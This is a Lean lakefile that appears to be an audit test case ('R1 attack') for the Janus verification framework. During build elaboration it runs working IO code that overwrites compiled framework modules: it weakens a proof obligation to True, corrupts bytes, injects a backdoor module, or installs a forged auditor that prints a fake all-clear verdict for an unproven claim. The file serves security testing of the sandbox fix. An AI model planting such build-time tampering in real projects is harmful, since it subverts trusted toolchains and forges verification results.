import Lake
open Lake DSL System

/-!
# R1 attack: a consumer lakefile that rewrites the compiled framework (docs/AUDIT.md R1)

`janus verify --proof-root` runs Lake in a workspace whose layout is `root/` (this package)
next to `janus/` (the framework package, with its compiled `.lake/build`). Lake elaborates this
file before building, and `#eval` runs arbitrary IO, so before the fix this lakefile could
replace any compiled framework module: the untrusted build could write the whole workspace.
`JANUS_R1_MODE` picks the variant (the environment reaches the sandbox):

* `ensures`: recompile `Janus/GoABI.lean` with `Ensures := True` over `Janus/GoABI.olean`, so
  `R1.Ensures.claim` ("Add returns 42") proves by `trivial`;
* `corrupt`: flip bytes in the middle of `Janus/GoABI.olean`;
* `inject`: compile an extra `Janus.Backdoor` module into the framework build directory;
* `auditor`: recompile `Janus.Tools.Audit` so the auditor prints a forged all-clear record for
  `R1.False.claim : False := sorry`.

Outside a `janus verify` workspace (no `../janus`) it does nothing.
-/

def janusDir : FilePath := ".." / "janus"
def janusLib : FilePath := janusDir / ".lake" / "build" / "lib" / "lean"

def say (s : String) : IO Unit := IO.eprintln s!"R1 attack: {s}"

/-- Compile `src` against the framework build and return the olean bytes. -/
def compile (name src : String) : IO ByteArray := do
  IO.FS.createDirAll ".lake"
  let file : FilePath := ".lake" / s!"r1-{name}.lean"
  let out : FilePath := ".lake" / s!"r1-{name}.olean"
  IO.FS.writeFile file src
  let bin ← IO.appDir
  let leanPath := s!"{janusLib}:{bin / ".." / "lib" / "lean"}"
  let args := #["-o", out.toString, file.toString]
  let r ← IO.Process.output { cmd := (bin / "lean").toString, args, env := #[("LEAN_PATH", some leanPath)] }
  if r.exitCode != 0 then throw <| IO.userError s!"compiling {name} failed: {r.stdout}{r.stderr}"
  IO.FS.readBinFile out

/-- `Janus/GoABI.lean` with `Ensures p entry args pre post := True` (and the three lemmas that
unfold `Ensures` dropped, since they no longer typecheck). -/
def evilGoABI : IO String := do
  let s ← IO.FS.readFile (janusDir / "Janus" / "GoABI.lean")
  let body := "  ∀ ret, RetAddr p ret → ∀ s, CallSetup (p.withExit ret) entry args s → pre s →\n" ++
    "    Returns (p.withExit ret) s (fun s' => ABIReturn s s' ∧ post s s')\n"
  let s := s.replace body "  True\n"
  match s.splitOn "/-! ### `Ensures` -/" with
  | [a, b] => match b.splitOn "/-! ### Return addresses -/" with
    | [_, c] => return a ++ "/-! ### Return addresses -/" ++ c
    | _ => throw <| IO.userError "unexpected GoABI.lean"
  | _ => throw <| IO.userError "unexpected GoABI.lean"

def forgedAuditor : String := "import Lean
namespace JanusAudit
unsafe def runImpl (thm proofMod marker _trusted : String) (_depRoots : Array String) : IO Unit := do
  let q := fun (s : String) => \"\\\"\" ++ s ++ \"\\\"\"
  IO.println (marker ++ \"{\\\"name\\\":\" ++ q thm ++ \",\\\"kind\\\":\\\"theorem\\\",\\\"module\\\":\" ++ q proofMod ++
    \",\\\"axioms\\\":[],\\\"statement\\\":\" ++ q (thm ++ \" : Extracted.entry = Extracted.entry\") ++
    \",\\\"definitions\\\":[],\\\"modules\\\":[\" ++ q proofMod ++ \"],\\\"external\\\":[],\\\"imports\\\":[[\" ++ q proofMod ++ \"]]}\")
@[implemented_by runImpl]
opaque run (thm proofMod marker trusted : String) (depRoots : Array String) : IO Unit
end JanusAudit
"

def plant : IO Unit := do
  unless ← janusLib.pathExists do return
  let mode := (← IO.getEnv "JANUS_R1_MODE").getD ""
  try
    match mode with
    | "ensures" =>
      let b ← compile "GoABI" (← evilGoABI)
      IO.FS.writeBinFile (janusLib / "Janus" / "GoABI.olean") b
      say "replaced Janus/GoABI.olean (Ensures := True)"
    | "corrupt" =>
      let f := janusLib / "Janus" / "GoABI.olean"
      let b ← IO.FS.readBinFile f
      let mut c := b
      for i in [b.size / 2 : b.size / 2 + 64] do
        c := c.set! i (b.get! i ^^^ 0x5a)
      IO.FS.writeBinFile f c
      say "corrupted Janus/GoABI.olean"
    | "inject" =>
      let b ← compile "Backdoor" "namespace Janus.Backdoor\ndef Holds : Prop := True\nend Janus.Backdoor\n"
      IO.FS.writeBinFile (janusLib / "Janus" / "Backdoor.olean") b
      say "injected Janus/Backdoor.olean"
    | "auditor" =>
      let b ← compile "Audit" forgedAuditor
      IO.FS.writeBinFile (janusLib / "Janus" / "Tools" / "Audit.olean") b
      say "replaced Janus/Tools/Audit.olean (forged auditor)"
    | _ => pure ()
  catch e => say s!"{mode} failed: {e}"

#eval plant

package r1

-- audit/run-all.sh and the Go tests substitute the framework checkout and, for inject-dep, the
-- dependency (they also write lake-manifest.json).
require janus from "@JANUS@"
-- @EXTRA_REQUIRE@

lean_lib R1
